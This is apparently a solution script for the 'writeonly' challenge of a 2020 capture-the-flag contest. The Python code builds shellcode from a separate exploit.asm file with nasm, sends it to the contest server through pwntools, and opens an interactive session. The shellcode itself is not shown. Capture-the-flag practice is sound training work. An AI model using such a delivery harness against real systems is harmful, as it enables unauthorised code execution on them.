from subprocess import run
from pwn import remote

run(["nasm", "exploit.asm"], check=True)
r = remote('writeonly.2020.ctfcompetition.com', 1337)
with open('exploit', 'rb') as f:
    payload = f.read()
    r.sendline(str(len(payload)))
    r.sendline(payload)
    r.interactive()